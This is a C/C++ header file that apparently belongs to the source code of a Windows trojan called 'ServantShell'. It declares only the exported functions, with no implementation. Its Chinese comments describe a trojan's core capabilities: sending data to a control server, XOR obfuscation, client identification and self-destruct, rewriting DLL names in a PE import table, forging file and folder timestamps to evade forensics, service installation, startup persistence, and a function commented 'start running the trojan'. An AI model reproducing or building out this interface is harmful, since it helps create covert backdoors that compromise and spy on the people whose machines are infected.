#pragma once
#include "../../../common/CommNames.h"

#ifdef SERVANTSHELL_EXPORTS
#	define SHELL_API extern "C" 
#else
#	define SHELL_API extern "C" __declspec(dllimport)
#endif

//获取当前路径，返回值以\结尾
SHELL_API LPCTSTR GetLocalPath();

//向服务器发送消息
SHELL_API BOOL SendMsg(const LPBYTE pData, DWORD dwSize, COMM_NAME commname = COMMNAME_DEFAULT, ULONG targetIP = 0);

//异或加解密
SHELL_API BOOL XFC(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1);

//获取客户端ID
SHELL_API BOOL GetClientID(GUID* pGuid);

//退出程序
SHELL_API void Exit();

//得到服务信息
SHELL_API void GetSvrInfo(PSERVICE_INFO* const info);

//客户端自毁
SHELL_API void SD();

//替换pe文件中IMAGE_IMPORT_DESCRIPTOR中的dll文件名
SHELL_API BOOL ReplaceIIDName(LPVOID lpBase, LPCSTR pTargetName, LPCSTR pReplaceName);

//根据ServantShell的时间调整 文件时间
SHELL_API BOOL AdjustTimes(LPCTSTR filepath);

//安装服务
SHELL_API BOOL InitSvr();

//调整所在目录的时间
SHELL_API void CheckDT();

//开始运行木马
SHELL_API BOOL Init(BOOL bWait = TRUE);

//加载启动项
SHELL_API void InitRun();